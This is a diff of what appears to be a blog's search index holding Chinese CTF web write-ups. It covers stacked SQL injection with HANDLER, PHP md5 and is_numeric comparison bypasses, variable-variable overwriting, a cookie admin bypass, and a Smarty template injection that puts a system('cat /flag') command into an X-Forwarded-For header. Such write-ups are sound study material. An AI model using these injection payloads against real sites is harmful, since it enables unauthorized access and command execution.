-<p>用<code>1&#39;;show databases;#</code>确定是堆叠注入<br><img src="https://img-blog.csdnimg.cn/20210209141449770.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">爆表<code>1&#39;;show tables;#</code><br><img src="https://img-blog.csdnimg.cn/20210209141521283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">查FlagHere表<code>1&#39;;show columns from FlagHere;#</code><br><img src="https://img-blog.csdnimg.cn/20210209141623174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">flag可能就在这个表里面，但是select与set、alter等众多关键词都被黑名单掉了，这里要利用<a href="https://blog.csdn.net/JesseYoung/article/details/40785137">HANDLER</a></p>
-<blockquote>
-<p>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ<br> NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p>
-</blockquote>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1&#x27;</span>;handler FlagHere open;handler FlagHere read first;Handler FlagHere close;#</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210209141821338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+    <title>（MRCTF2020）Ez_bypass</title>
+    <url>/2021/02/02/20210202/</url>
+    <content><![CDATA[<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p><img src="https://img-blog.csdnimg.cn/20210209161303166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源码<br><img src="https://img-blog.csdnimg.cn/20210209161323401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#I put something in F12 <span class="keyword">for</span> you</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class="line">    $id=$_GET[&#x27;id&#x27;];</span><br><span class="line">    $gg=$_GET[&#x27;gg&#x27;];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo &#x27;You got the first step&#x27;;</span><br><span class="line">        if(isset($_POST[&#x27;passwd&#x27;])) &#123;</span><br><span class="line">            $passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#x27;Good Job!&#x27;;</span><br><span class="line">                     highlight_file(&#x27;flag.php&#x27;);</span><br><span class="line">                     die(&#x27;By Retr_0&#x27;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     echo <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                echo &#x27;You can not get it !&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(&#x27;only one way to get the flag&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(&#x27;Please input first&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>第一层：<code>(md5($id) === md5($gg) &amp;&amp; $id !== $gg)=true</code><br>传入数组，使得<code>md5($id)===md5($dd)===null</code>，然后设置两个不同的键值即可</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">?id[]=a&amp;gg[]=b</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2021020916180344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">第二层：<code>(!is_numeric($passwd) &amp;&amp; $passwd==1234567)=true</code><br><a href="https://www.runoob.com/php/php-is_numeric-function.html">PHP is_numeric() 函数</a></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">passwd=<span class="number">1234567</span>abc</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210209161951240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 ]]></content>
       <categories>
         <category>web</category>
       </categories>
       <tags>
-        <tag>SQL</tag>
-        <tag>堆叠注入</tag>
-        <tag>单引号字符型注入</tag>
-        <tag>HANDLER</tag>
+        <tag>PHP</tag>
+        <tag>is_numeric()</tag>
+        <tag>md5</tag>
       </tags>
   </entry>
   <entry>
@@ -472,26 +492,6 @@
       </tags>
   </entry>
   <entry>
-    <title>（MRCTF2020）Ez_bypass</title>
-    <url>/2021/02/02/20210202/</url>
-    <content><![CDATA[<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p><img src="https://img-blog.csdnimg.cn/20210209161303166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源码<br><img src="https://img-blog.csdnimg.cn/20210209161323401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#I put something in F12 <span class="keyword">for</span> you</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class="line">    $id=$_GET[&#x27;id&#x27;];</span><br><span class="line">    $gg=$_GET[&#x27;gg&#x27;];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo &#x27;You got the first step&#x27;;</span><br><span class="line">        if(isset($_POST[&#x27;passwd&#x27;])) &#123;</span><br><span class="line">            $passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#x27;Good Job!&#x27;;</span><br><span class="line">                     highlight_file(&#x27;flag.php&#x27;);</span><br><span class="line">                     die(&#x27;By Retr_0&#x27;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     echo <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                echo &#x27;You can not get it !&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(&#x27;only one way to get the flag&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(&#x27;Please input first&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>第一层：<code>(md5($id) === md5($gg) &amp;&amp; $id !== $gg)=true</code><br>传入数组，使得<code>md5($id)===md5($dd)===null</code>，然后设置两个不同的键值即可</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">?id[]=a&amp;gg[]=b</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/2021020916180344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">第二层：<code>(!is_numeric($passwd) &amp;&amp; $passwd==1234567)=true</code><br><a href="https://www.runoob.com/php/php-is_numeric-function.html">PHP is_numeric() 函数</a></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">passwd=<span class="number">1234567</span>abc</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210209161951240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>is_numeric()</tag>
-        <tag>md5</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>（BJDCTF2020）ZJCTF，不过如此</title>
     <url>/2021/02/03/20210203/</url>
     <content><![CDATA[<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p><img src="https://img-blog.csdnimg.cn/20210209162454557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210209162931298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">base64解码</p>
@@ -508,24 +508,6 @@
         <tag>php://input</tag>
         <tag>preg_replace()</tag>
         <tag>data://text/plain</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>（BJDCTF2020）The mystery of ip</title>
-    <url>/2021/02/06/20210206/</url>
-    <content><![CDATA[<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p><img src="https://img-blog.csdnimg.cn/20210209213259155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">分别查看flag.php和hint.php<br><img src="https://img-blog.csdnimg.cn/20210209213322998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/20210209213335649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210209213945136.png" alt="在这里插入图片描述">猜想是xff或者client-ip，抓包<br><img src="https://img-blog.csdnimg.cn/20210209214317221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">确定是xff</p>
-<p><a href="https://blog.csdn.net/qq_45521281/article/details/107556915">smarty模板注入</a></p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: &#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210209214510520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>xff</tag>
-        <tag>smarty模板注入</tag>
       </tags>
   </entry>
   <entry>
@@ -552,6 +534,51 @@
         <tag>SQL</tag>
         <tag>反序列化</tag>
         <tag>user.php.bak</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>（BJDCTF2020）Mark loves cat</title>
+    <url>/2021/02/05/20210205/</url>
+    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p><img src="https://img-blog.csdnimg.cn/20210209174501339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">扫描目录<br><img src="https://img-blog.csdnimg.cn/20210209174653613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现是.git源码泄露<br><img src="https://img-blog.csdnimg.cn/20210209175704410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag.php</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag = file_get_contents(&#x27;/flag&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>index.php</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line">$is = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">$handsome = &#x27;yds&#x27;;</span><br><span class="line"></span><br><span class="line">foreach($_POST as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;</span><br><span class="line">        <span class="built_in">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;</span><br><span class="line">    <span class="built_in">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;</span><br><span class="line">    <span class="built_in">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;the flag is: &quot;</span>.$flag;</span><br></pre></td></tr></table></figure>
+<p>forsearch：<br>post传参和get传参的参数键名和值</p>
+<p>首先我们post：$flag=flag</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">foreach($_POST as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>简单好理解一点，我们直接带入第一行后再比较第二行<br>这样就变成了$$flag = flag</p>
+<p>接下来GET：?yds=flag</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>$x</code>为yds，<code>$y</code>为flag，所以<code>$$x</code>表示<code>$yds</code>，<code>$$y</code>也就是<code>$flag</code>，<code>$flag</code>就是真正的<code>flag&#123;XXXXXX&#125;</code>。<code>$$x</code> =<code>$$y</code>，也就是<code>$yds=flag&#123;XXXXXX&#125;</code>。<br>只要没有flag参数，就会<code>exit($yds)</code>，就可以得到flag了。<br>有</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">GET: ?yds=flag</span><br><span class="line">POST: ?$flag=flag</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210209180503702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">查看源码，发现flag<br><img src="https://img-blog.csdnimg.cn/20210209180529315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>.git</tag>
+        <tag>forsearch</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>（BJDCTF2020）The mystery of ip</title>
+    <url>/2021/02/06/20210206/</url>
+    <content><![CDATA[<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p><img src="https://img-blog.csdnimg.cn/20210209213259155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">分别查看flag.php和hint.php<br><img src="https://img-blog.csdnimg.cn/20210209213322998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210209213335649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210209213945136.png" alt="在这里插入图片描述">猜想是xff或者client-ip，抓包<br><img src="https://img-blog.csdnimg.cn/20210209214317221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">确定是xff</p>
+<p><a href="https://blog.csdn.net/qq_45521281/article/details/107556915">smarty模板注入</a></p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: &#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210209214510520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>xff</tag>
+        <tag>smarty模板注入</tag>
       </tags>
   </entry>
   <entry>
@@ -599,33 +626,6 @@
       </tags>
   </entry>
   <entry>
-    <title>（BJDCTF2020）Mark loves cat</title>
-    <url>/2021/02/05/20210205/</url>
-    <content><![CDATA[<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p><img src="https://img-blog.csdnimg.cn/20210209174501339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">扫描目录<br><img src="https://img-blog.csdnimg.cn/20210209174653613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现是.git源码泄露<br><img src="https://img-blog.csdnimg.cn/20210209175704410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag.php</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag = file_get_contents(&#x27;/flag&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p>index.php</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line">$is = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">$handsome = &#x27;yds&#x27;;</span><br><span class="line"></span><br><span class="line">foreach($_POST as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;</span><br><span class="line">        <span class="built_in">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;</span><br><span class="line">    <span class="built_in">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;</span><br><span class="line">    <span class="built_in">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo <span class="string">&quot;the flag is: &quot;</span>.$flag;</span><br></pre></td></tr></table></figure>
-<p>forsearch：<br>post传参和get传参的参数键名和值</p>
-<p>首先我们post：$flag=flag</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">foreach($_POST as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>简单好理解一点，我们直接带入第一行后再比较第二行<br>这样就变成了$$flag = flag</p>
-<p>接下来GET：?yds=flag</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><code>$x</code>为yds，<code>$y</code>为flag，所以<code>$$x</code>表示<code>$yds</code>，<code>$$y</code>也就是<code>$flag</code>，<code>$flag</code>就是真正的<code>flag&#123;XXXXXX&#125;</code>。<code>$$x</code> =<code>$$y</code>，也就是<code>$yds=flag&#123;XXXXXX&#125;</code>。<br>只要没有flag参数，就会<code>exit($yds)</code>，就可以得到flag了。<br>有</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">GET: ?yds=flag</span><br><span class="line">POST: ?$flag=flag</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210209180503702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">查看源码，发现flag<br><img src="https://img-blog.csdnimg.cn/20210209180529315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>PHP</tag>
-        <tag>.git</tag>
-        <tag>forsearch</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>（BSidesCF 2019）Kookie</title>
     <url>/2021/02/10/20210210/</url>
     <content><![CDATA[<h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p><img src="https://img-blog.csdnimg.cn/20210210212451476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDE4MTA0Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">按提示我们使用admin账户登录，并且存在cookie/monster两个账户<br>抓包添加<code>Cookie: username=admin</code>即可得到flag</p>
@@ -637,32 +637,6 @@
       <tags>
         <tag>PHP</tag>
         <tag>cookie</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>BASIC RCE</title>
-    <url>/2020/11/28/BASIC%20RCE/</url>
